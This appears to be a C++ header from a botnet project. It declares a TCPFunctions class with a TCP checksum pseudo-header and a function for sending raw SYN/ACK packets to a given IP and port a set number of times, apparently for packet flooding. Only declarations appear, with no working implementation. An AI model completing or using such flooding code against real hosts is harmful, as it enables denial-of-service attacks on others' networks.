#ifndef TCP_FUNCTIONS_H
#define TCP_FUNCTIONS_H

#include "../Socket/SocketIncludes.h"

namespace botnet {

class TCPFunctions {
private:
	TCPFunctions()  = delete;
	~TCPFunctions() = delete;

	struct pseudo_header    //needed for checksum calculation
	{
	    unsigned int source_address;
	    unsigned int dest_address;
	    unsigned char placeholder;
	    unsigned char protocol;
	    unsigned short tcp_length;
	     
	    struct tcphdr tcp;
	};
	static unsigned short csum(unsigned short *ptr,int nbytes);
	 
public:
	static void SendRawPacketData(const char dest_ip[INET_ADDRSTRLEN], uint16_t dest_port, bool syn, bool ack, size_t count);
	
};


}

#endif